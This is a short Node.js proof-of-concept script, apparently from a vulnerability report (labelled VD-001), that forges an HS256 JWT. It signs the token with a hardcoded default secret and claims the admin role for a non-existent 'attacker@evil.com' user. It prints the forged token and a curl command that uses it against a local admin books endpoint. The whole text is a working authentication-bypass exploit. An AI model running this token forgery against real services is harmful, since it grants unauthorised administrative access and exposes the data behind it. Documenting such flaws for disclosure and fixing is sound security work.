const crypto = require('crypto');

// Secret from .env.local — this is the actual secret in use
const secret = 'your-super-secret-jwt-key-change-this-in-production';

function base64url(str) {
  return Buffer.from(str).toString('base64')
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

const header  = base64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
const payload = base64url(JSON.stringify({
  id:    '000000000000000000000001',
  email: 'attacker@evil.com',
  role:  'admin',
  iat:   Math.floor(Date.now() / 1000),
  exp:   Math.floor(Date.now() / 1000) + 86400
}));

const sig = crypto.createHmac('sha256', secret)
  .update(header + '.' + payload)
  .digest('base64')
  .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

const token = header + '.' + payload + '.' + sig;

console.log('=== VD-001: JWT FORGERY PROOF OF CONCEPT ===');
console.log('Secret used:', secret);
console.log('Role claimed: admin (no account exists)');
console.log('');
console.log('FORGED TOKEN:');
console.log(token);
console.log('');
console.log('Run this command to exploit:');
console.log('curl -s -H "Authorization: Bearer ' + token + '" http://localhost:3000/api/admin/books');
